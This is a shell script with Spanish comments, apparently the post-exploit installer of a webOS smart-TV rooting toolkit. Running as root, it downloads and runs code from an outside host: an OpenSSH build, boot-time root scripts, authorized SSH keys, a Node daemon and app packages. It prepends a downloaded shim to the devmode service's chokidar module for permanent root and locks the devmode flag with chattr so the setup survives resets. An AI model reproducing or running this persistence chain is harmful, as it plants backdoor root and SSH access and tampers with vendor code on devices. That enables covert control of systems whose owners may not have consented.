#!/bin/sh
# rootcmd_install.sh v2: instalador en la TV (corre como root tras el exploit)
# Deja: cadena root permanente + sshd :22 + daemon + telnet + apps REGISTRADAS.
# one-click.sh inyecta la IP real del ordenador en el placeholder __HOST__.
# Lecciones 2026-10-12 (run E2E en TV recién restaurada):
#   - la TV NO tiene ssh-keygen → el hostkey lo genera one-click.sh (formato PEM;
#     el OpenSSH 6.1 de la TV no lee "OPENSSH PRIVATE KEY")
#   - el hijo del exploit corre en el jail y NO ve /proc/1/root → el shim puede
#     quedar PENDIENTE; la etapa SSH final del one-click lo instala y verifica
#   - informe legible por prisoner en /tmp/ROOTED.txt (permisos 644)
export PATH=/usr/sbin:/usr/bin:/sbin:/bin
HOST="${1:-__HOST__}"
N=/media/developer/natxo
LOG=$N/install.log
RPT=/tmp/ROOTED.txt
CG=/proc/1/root/media/cryptofs/apps/usr/palm/services/com.palmdts.devmode.service
echo "== install $(date) uid=$(id -u) host=$HOST ==" > $LOG
echo "ROOTED $(date) uid=$(id -u)" > $RPT
chmod 644 $RPT 2>/dev/null

# 1. estructura + openssh build
mkdir -p $N/init.d $N/bin $N/daemon $N/devmode-state $N/apps /var/rootssh
wget -q http://$HOST:8899/payload/openssh-build.tgz -O /tmp/openssh-build.tgz && \
  tar xzf /tmp/openssh-build.tgz -C $N/ && echo OPENSSH_OK >> $LOG
export LD_LIBRARY_PATH=$N/openssh/lib/openssh:$LD_LIBRARY_PATH

# 2. cadena root (boot-root + start.sh + init.d)
for f in boot-root.sh start.sh; do
  wget -q http://$HOST:8899/scripts/$f -O $N/$f && chmod 755 $N/$f
done
for f in 90-natxo-sshd 95-natxo-restore 99-suidtest 98-natxo-daemon; do
  wget -q http://$HOST:8899/scripts/init.d/$f -O $N/init.d/$f && chmod 755 $N/init.d/$f
done
echo CHAIN_OK >> $LOG

# 3. hostkey + authorized_keys (hostkey PRE-GENERADO por one-click, la TV no tiene ssh-keygen)
if [ ! -s $N/hostkey ]; then
  wget -q http://$HOST:8899/payload/hostkey -O $N/hostkey 2>/dev/null
fi
[ -s $N/hostkey ] || ssh-keygen -t rsa -b 2048 -m PEM -N "" -f $N/hostkey >/dev/null 2>&1
chmod 600 $N/hostkey 2>/dev/null
if [ ! -s $N/authorized_keys ]; then
  wget -q http://$HOST:8899/payload/authorized_keys -O $N/authorized_keys 2>/dev/null
fi
chmod 600 $N/authorized_keys 2>/dev/null
cp -f $N/authorized_keys /var/rootssh/authorized_keys 2>/dev/null
cp -f $N/hostkey /var/rootssh/hostkey 2>/dev/null
chmod 600 /var/rootssh/hostkey 2>/dev/null
if [ -s $N/hostkey ]; then echo HOSTKEY_OK >> $LOG; else echo HOSTKEY_MISSING >> $LOG; fi

# 4. shim en chokidar (root permanente), intento en ambas vistas; si el jail lo
#    bloquea queda PENDIENTE y lo remata la etapa SSH del one-click.
SHIM_DONE=0
for CGV in "$CG" "/media/cryptofs/apps/usr/palm/services/com.palmdts.devmode.service"; do
  CH=$CGV/node_modules/chokidar
  if [ -f $CH/index.js ] && ! grep -q NATXO_BOOTROOT $CH/index.js 2>/dev/null; then
    wget -q http://$HOST:8899/payload/shim-chokidar.js -O /tmp/shim.js
    cp -f $CH/index.js $N/devmode-state/chokidar-index.js.ORIGINAL 2>/dev/null
    cat /tmp/shim.js $CH/index.js > /tmp/idx.tmp 2>/dev/null && cp /tmp/idx.tmp $CH/index.js 2>/dev/null && SHIM_DONE=1
  fi
done
[ $SHIM_DONE -eq 1 ] && echo SHIM_OK >> $LOG || echo SHIM_PENDING_SSH_STAGE >> $LOG

# 5. daemon + token (solo si no existe token = no pisar instalaciones previas)
wget -q http://$HOST:8899/payload/natxo-daemon.js -O $N/daemon/natxo-daemon.js
wget -q http://$HOST:8899/payload/install-app.sh -O $N/bin/install-app.sh
chmod 755 $N/daemon/natxo-daemon.js $N/bin/install-app.sh
[ -s $N/daemon/token ] || head -c 16 /dev/urandom | od -An -tx1 | tr -d ' \n' > $N/daemon/token
chmod 600 $N/daemon/token
echo "TOKEN: $(cat $N/daemon/token)" >> $LOG

# 6. apps del payload: descargar ipks (registro real en el paso 7b)
mkdir -p /tmp/apps
wget -q http://$HOST:8899/payload/apps/manifest.txt -O /tmp/apps.manifest 2>/dev/null
if [ -s /tmp/apps.manifest ]; then
  while read f; do
    [ -n "$f" ] || continue
    wget -q "http://$HOST:8899/payload/apps/$f" -O "/tmp/apps/$f"
    echo "DL $f" >> $LOG
  done < /tmp/apps.manifest
else
  echo "APPS_NONE" >> $LOG
fi

# 7. arrancar daemon
(setsid /usr/bin/node $N/daemon/natxo-daemon.js >/dev/null 2>&1 &)
sleep 4

# 7b. REGISTRAR apps (dev/install con suscripción viva → icono en el launcher)
for ipk in /tmp/apps/*.ipk; do
  [ -s "$ipk" ] || continue
  base=$(basename "$ipk")
  (setsid sh -c "luna-send -n 30 -f luna://com.webos.appInstallService/dev/install '{\"id\":\"testing\",\"ipkUrl\":\"$ipk\",\"subscribe\":true}' > /tmp/reg_$base.log 2>&1 < /dev/null" >/dev/null 2>&1 &)
  sleep 32
  if grep -q '"state": "installed"' /tmp/reg_$base.log 2>/dev/null; then
    echo "APP_OK $base" >> $LOG
  else
    echo "APP_FAIL $base" >> $LOG
  fi
done

# 7c. inyectar el token del daemon en las apps que lo necesiten (NZ Store)
TOK=$(cat $N/daemon/token)
for CFG in /media/developer/apps/usr/palm/applications/com.natxobsd.nzstore/config.js \
           /media/cryptofs/apps/usr/palm/applications/com.natxobsd.nzstore/config.js; do
  if [ -f "$CFG" ]; then
    sed -i "s/NZ_TOKEN = '[^']*'/NZ_TOKEN = '$TOK'/" "$CFG" 2>/dev/null && echo "TOKEN_INJECT $(basename $(dirname $CFG))" >> $LOG
  fi
done

sh $N/start.sh
sleep 2
tail -3 $N/boot.log >> $LOG 2>&1

# 8. ANTI-WIPE: flag devmode_enabled inmutable (las apps sobreviven cortes de luz)
mount -o remount,rw /var/luna/preferences 2>/dev/null
chattr +i /var/luna/preferences/devmode_enabled 2>/dev/null
echo "ANTIWIPE: $(lsattr /var/luna/preferences/devmode_enabled 2>/dev/null)" >> $LOG

# 9. verificación + informe legible desde prisoner (/tmp/ROOTED.txt, 644)
if grep -q ':0016 ' /proc/net/tcp 2>/dev/null; then echo "PORT22_UP" >> $RPT; else echo "PORT22_DOWN" >> $RPT; fi
grep -E 'OPENSSH|CHAIN|HOSTKEY|SHIM|APP_' $LOG >> $RPT 2>/dev/null
echo "TOKEN: $(cat $N/daemon/token)" >> $RPT
echo "== DONE $(date) ==" >> $LOG
echo "DONE" >> $RPT
